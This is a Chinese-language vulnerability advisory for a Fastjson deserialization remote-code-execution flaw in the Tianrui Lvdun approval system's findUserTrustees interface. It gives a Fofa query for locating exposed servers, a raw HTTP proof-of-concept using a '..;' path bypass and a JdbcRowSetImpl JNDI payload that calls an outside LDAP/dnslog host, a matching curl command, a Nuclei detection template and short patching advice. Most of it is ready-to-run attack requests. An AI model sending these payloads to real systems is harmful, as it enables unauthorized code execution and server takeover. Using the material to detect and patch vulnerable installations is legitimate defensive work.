# 天锐绿盾审批系统 findUserTrustees Fastjson反序列化命令执行漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 天锐绿盾审批系统 findUserTrustees Fastjson反序列化命令执行漏洞 |
| 漏洞类型 | RCE（Fastjson反序列化） |
| 组件名称 | 天锐绿盾审批系统 |
| 影响版本 | 天锐绿盾审批系统 |
| 漏洞日期 | 2026-03-29 |

## 漏洞概述

该系统的 findUserTrustees 接口存在 Fastjson 反序列化漏洞。可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的反序列化缺陷，在未经授权的情况下，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## Fofa查询语法

```
app="TIPPAY-绿盾审批系统"
```

## 漏洞复现

### POC

```http
POST /trwfe/login.jsp/..;/rest/ext/findUserTrustees HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Content-Type: application/json
Content-Length: 205

{"userId":"admin","userName":"test","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://bejbnm.dnslog.cn","autoCommit":true,"MsgEffect":"true"}
```

### 特征

- 请求路径：`/trwfe/login.jsp/..;/rest/ext/findUserTrustees`
- 请求方法：POST
- Content-Type：application/json
- 利用方式：Fastjson JNDI注入
- 关键payload：`"@type":"com.sun.rowset.JdbcRowSetImpl"`

### 验证命令

```bash
# DNSLog检测
curl -X POST "http://TARGET/trwfe/login.jsp/..;/rest/ext/findUserTrustees" \
  -H "Content-Type: application/json" \
  -d '{"userId":"admin","userName":"test","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://your.dnslog.cn","autoCommit":true,"MsgEffect":"true"}'
```

## Nuclei 检测脚本

```yaml
id: tianrui-lvduan-findusertrustees-fastjson-rce

info:
  name: Tianrui Lvduan findUserTrustees Fastjson Deserialization RCE
  author: 实战安全研究
  severity: critical
  description: 天锐绿盾审批系统 findUserTrustees 接口存在Fastjson反序列化命令执行漏洞
  reference:
    - https://blog.wuyaoxuexi.cn
  tags: tianrui,lvduan,fastjson,rce,deserialization

requests:
  - method: POST
    path:
      - "{{BaseURL}}/trwfe/login.jsp/..;/rest/ext/findUserTrustees"
    headers:
      Content-Type: application/json
    body: |
      {
        "userId": "admin",
        "userName": "test",
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://{{interactsh-url}}/test",
        "autoCommit": true,
        "MsgEffect": "true"
      }
    matchers:
      - type: word
        words:
          - "com.sun.rowset"
          - "Fastjson"
          - "JSONException"
        part: body
        case-insensitive: true
```

## 漏洞修复建议

1. 建议联系厂商打补丁或升级版本。
2. 增加Web应用防火墙防护。
3. 关闭互联网暴露面或接口设置访问权限。
